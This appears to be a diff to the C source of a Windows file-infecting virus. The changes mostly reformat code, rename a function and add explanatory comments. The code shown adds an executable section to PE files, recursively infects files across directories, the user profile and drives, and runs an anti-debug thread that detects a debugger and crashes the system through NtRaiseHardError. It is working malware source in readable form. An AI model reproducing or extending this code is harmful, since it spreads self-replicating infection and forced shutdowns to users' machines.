@@ -458,10 +458,10 @@ void WINAPI InfectFile(PSTR FileName)
         }
  
         CodeSize=(ULONG)VirusEnd-(ULONG)VirusCode;
-        SectionSize=CodeSize+VirusSize;
+        SectionSize = CodeSize + VirusSize;
  
         FileSize=GetFileSize(hFile,NULL);
-        AlignedSize=FileSize+Align(SectionSize,SectionAlignment); // File size need to be aligned. Otherwise the program will not run after infection.
+        AlignedSize=FileSize + Align(SectionSize,SectionAlignment); // File size need to be aligned. Otherwise the program will not run after infection.
  
         hMap=CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
  
@@ -476,7 +476,7 @@ void WINAPI InfectFile(PSTR FileName)
  
                 // Add a new section
  
-                pISH=AddSection(MappedFile,"Zero",SectionSize,IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE);
+                pISH = AddSection(MappedFile,"Zero",SectionSize,IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE);
  
                 if(pISH)
                 {
@@ -552,7 +552,10 @@ void WINAPI InfectFile(PSTR FileName)
     NtClose(hMap);
     NtClose(hFile);
 }
- 
+
+// Search all files in a path.
+// If found a file -> infect it!
+// If found a folder -> dive into that folder to find files
 void WINAPI SearchFile(PSTR Directory)
 {
     HANDLE hFind;
@@ -568,7 +571,7 @@ void WINAPI SearchFile(PSTR Directory)
  
     sprintf(SearchName,"%s\\*",Directory);
  
-    hFind=FindFirstFileA(SearchName, &FindData);
+    hFind = FindFirstFileA(SearchName, &FindData);
  
     if(hFind!=INVALID_HANDLE_VALUE)
     {
@@ -642,29 +645,42 @@ void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
 }
  
 __declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[]={TlsCallback,NULL};
- 
-DWORD WINAPI Zero(PVOID p)
+
+DWORD WINAPI AntiDebug(PVOID p)
 {
     BOOLEAN bl;
     LARGE_INTEGER delay;
  
     ULONG Response;
-     
-    PPEB Peb=NtCurrentPeb();
+    
+    PPEB Peb = NtCurrentPeb();
     ULONG_PTR DebugPort=0;
  
     delay.QuadPart=(__int64)-10*10000;
  
     while(1)
     {
+        // Indicates whether the specified process is currently being debugged. The PEB 
+        // structure, however, is an internal operating-system structure whose layout may 
+        // change in the future. It is best to use the CheckRemoteDebuggerPresent function 
+        // instead.
         if(Peb->BeingDebugged)
         {
             break;
         }
- 
+
+        /*
+        __kernel_entry NTSTATUS NtQueryInformationProcess(
+        [in]            HANDLE           ProcessHandle,
+        [in]            PROCESSINFOCLASS ProcessInformationClass,
+        [out]           PVOID            ProcessInformation,
+        [in]            ULONG            ProcessInformationLength,
+        [out, optional] PULONG           ReturnLength
+        );
+        */
         if(NT_SUCCESS(NtQueryInformationProcess(NtCurrentProcess(),ProcessDebugPort,&DebugPort,sizeof(ULONG_PTR),NULL)))
         {
-            if(DebugPort)
+            if(DebugPort != 0)
             {
                 break;
             }
@@ -673,7 +689,7 @@ DWORD WINAPI Zero(PVOID p)
         NtDelayExecution(FALSE,&delay);
     }
  
-    RtlAdjustPrivilege(19,TRUE,FALSE,&bl);
+    RtlAdjustPrivilege(19,TRUE,FALSE,&bl); // SE_SHUTDOWN_PRIVILEGE 
     NtRaiseHardError(0xC000026A,0,0,NULL,OptionShutdownSystem,&Response);
  
     while(1);
@@ -740,13 +756,15 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
         NtTerminateProcess(NtCurrentProcess(),0);
         while(1);
     }
- 
-    hFile= CreateFileA(_pgmptr,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+    
+    // Get handle of current exe file for reading information
+    hFile = CreateFileA(_pgmptr,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
  
     if(hFile!=INVALID_HANDLE_VALUE)
     {
-        VirusSize=GetFileSize(hFile,NULL);
-        VirusFile=VirtualAlloc(NULL,VirusSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+        // Khởi tạo bộ nhớ cho virus file
+        VirusSize = GetFileSize(hFile,NULL);
+        VirusFile = VirtualAlloc(NULL , VirusSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
  
         if(VirusFile)
         {
@@ -762,8 +780,8 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
     }
  
     // Create worker threads
-     
-    CreateThread(NULL,0,Zero,NULL,0,NULL);
+
+    CreateThread(NULL,0,AntiDebug,NULL,0,NULL);
     CreateThread(NULL,0,InfectUserProfile,NULL,0,NULL);
     CreateThread(NULL,0,InfectDrives,NULL,0,NULL);
  
